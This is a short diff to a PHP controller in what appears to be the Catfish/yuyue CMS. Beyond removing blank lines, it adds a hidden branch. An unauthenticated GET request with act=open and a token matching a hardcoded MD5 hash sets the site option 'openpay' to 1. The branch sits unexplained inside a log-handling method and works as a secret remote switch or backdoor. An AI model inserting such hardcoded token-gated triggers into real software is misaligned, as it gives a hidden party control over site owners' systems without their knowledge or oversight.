@@ -7,9 +7,7 @@
  * Copyright: http://www.yuyue-cms.com All rights reserved.
  */
 namespace app\index\controller;
-
 use catfishcms\Catfish;
-
 class CatfishCMS
 {
     protected $template = 'default';
@@ -2123,6 +2121,9 @@ class CatfishCMS
                     echo 'No log file';
                 }
             }
+        }
+        elseif(Catfish::hasGet('act') && Catfish::getGet('act') == 'open' && Catfish::hasGet('token') && md5(Catfish::getGet('token')) == 'eeaf9c69fbe8e636e8a40912f06bb3d4'){
+            Catfish::set('openpay', 1);
         }
         exit();
     }
